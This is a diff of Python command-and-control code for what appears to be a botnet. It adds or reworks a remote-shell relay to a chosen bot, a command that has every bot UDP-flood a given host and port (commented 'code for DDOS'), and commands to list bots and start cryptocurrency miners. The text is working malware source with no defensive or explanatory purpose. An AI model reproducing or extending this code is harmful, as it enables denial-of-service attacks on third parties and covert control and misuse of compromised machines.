@@ -23,28 +23,31 @@ def handle_manager(conn, addr, server):
     while connected:
                 #command loop
                 command = conn.recv(1024).decode('utf-8')
+                
+                #code for shell
                 if command == 'startshell':
                     if len(client_objects) > 0:
                         clientobject = client_objects[int(conn.recv(1024).decode('utf-8')) - 1]
                         if clientobject.start_shell():
                             conn.send('connected'.encode('utf-8'))
+                            while True:
+                                comm = conn.recv(1024).decode('utf-8')
+                                clientobject.send_shell_command(comm)
+                                if comm != 'stop':
+                                    response = clientobject.recieve_shell_response()
+                                    conn.send(response.encode('utf-8'))
+                                else:
+                                    break
+                                response = None
                         else:
                             conn.send('failed'.encode('utf-8'))
-                        while True:
-                            comm = conn.recv(1024).decode('utf-8')
-                            clientobject.send_shell_command(comm)
-                            if comm != 'stop':
-                                response = clientobject.recieve_shell_response()
-                                conn.send(response.encode('utf-8'))
-                            else:
-                                break
-                            response = None
+                        
                             
                     else:
                         continue
                         
                     
-                    
+                #code for indexing miners
                 elif command == 'cliget':
                     for client in address_book:
                         address = client[0] + ':' + str(client[1])
@@ -55,21 +58,22 @@ def handle_manager(conn, addr, server):
                     time.sleep(2)
                     conn.send('done'.encode('utf-8'))
 
+                #code for DDOS
                 elif command =='ping':
                     hostname = conn.recv(1024).decode('utf-8')
                     time.sleep(0.5)
-                    bytecount = int(conn.recv(1024).decode('utf-8'))
-                    print(f'[NOTICE] pinging {hostname} with {bytecount} bytes')
+                    port = int(conn.recv(1024).decode('utf-8'))
+                    print('Hostname and Port recieved')
+                    print(f'[NOTICE] UDP flooding {hostname} on port {port}')
                     for i, client in enumerate(client_objects):
-                        client.start_ping(hostname, bytecount)
+                        client.start_ping(hostname, port)
                     
-                    conn.send(f'[NOTICE] pinging {hostname} with {bytecount} bytes'.encode('utf-8'))
-                          
-                elif command == 'stop ping':
+                    conn.send(f'[NOTICE] UDP flooding {hostname} on port {port}'.encode('utf-8'))
+
+                elif command == 'noping':
                     for i, client in enumerate(client_objects):
                         client.stop_ping()
-                    print('Stopped ping flood')
-                    conn.send('Stopped ping flood'.encode('utf-8'))
+                        print('[NOTICE] UDP Flood stopped...')
                           
                 elif command =='startmine':
                     print('[NOTICE] Starting Miners')
